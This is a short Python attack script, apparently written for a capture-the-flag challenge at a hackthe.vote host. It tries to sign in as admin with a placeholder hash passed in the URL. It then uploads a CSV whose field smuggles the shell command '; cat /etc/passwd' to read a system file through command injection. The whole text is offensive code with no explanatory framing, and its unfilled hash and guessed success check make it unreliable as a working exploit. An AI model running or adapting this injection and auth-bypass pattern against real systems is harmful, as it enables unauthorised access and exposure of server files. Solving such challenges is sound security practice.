import requests

# Define the target URL
base_url = 'http://graph.chal.hackthe.vote'

# Step 1: Sign in as admin if possible
admin_hash = "<known_admin_hash>"
signin_response = requests.get(f"{base_url}/signin?admin={admin_hash}")

# Check if signed in successfully
if "success" in signin_response.text:
    print("Successfully signed in as admin.")

# Step 2: Upload a crafted CSV file
files = {'csv': ('exploit.csv', 'name,command\nexploit,; cat /etc/passwd\n')}
upload_response = requests.post(f"{base_url}/data", files=files, cookies=signin_response.cookies)

# Step 3: Check the output file or response to see if the flag is available
graph_response = requests.get(f"{base_url}/graph")
print(graph_response.text)
